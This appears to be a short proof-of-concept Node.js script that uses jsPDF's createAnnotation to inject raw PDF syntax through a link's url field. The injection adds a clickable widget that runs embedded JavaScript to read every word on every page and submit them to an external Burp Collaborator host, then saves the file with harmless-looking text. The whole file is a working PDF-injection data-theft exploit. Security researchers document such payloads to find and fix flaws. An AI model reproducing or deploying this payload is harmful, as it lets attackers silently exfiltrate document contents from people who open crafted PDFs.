const {jsPDF} = require("jspdf");
var doc = new jsPDF();
doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(
words = [];
for(page=0;page<this.numPages;page++) {
    for(wordPos=0;wordPos<this.getPageNumWords(page);wordPos++) {
        word = this.getPageNthWord(page, wordPos, true);
        words.push(word);
    }
}
app.alert(words);
this.submitForm('https://mc24y606onar7maly9poz8539ufn3c.burpcollaborator.net?words='+encodeURIComponent(words.join(',')));
`});
doc.text(20, 20, 'Click me test');
doc.text(20, 40, 'Abc Def');
doc.text(20, 60, 'Some word');
doc.save("output.pdf");
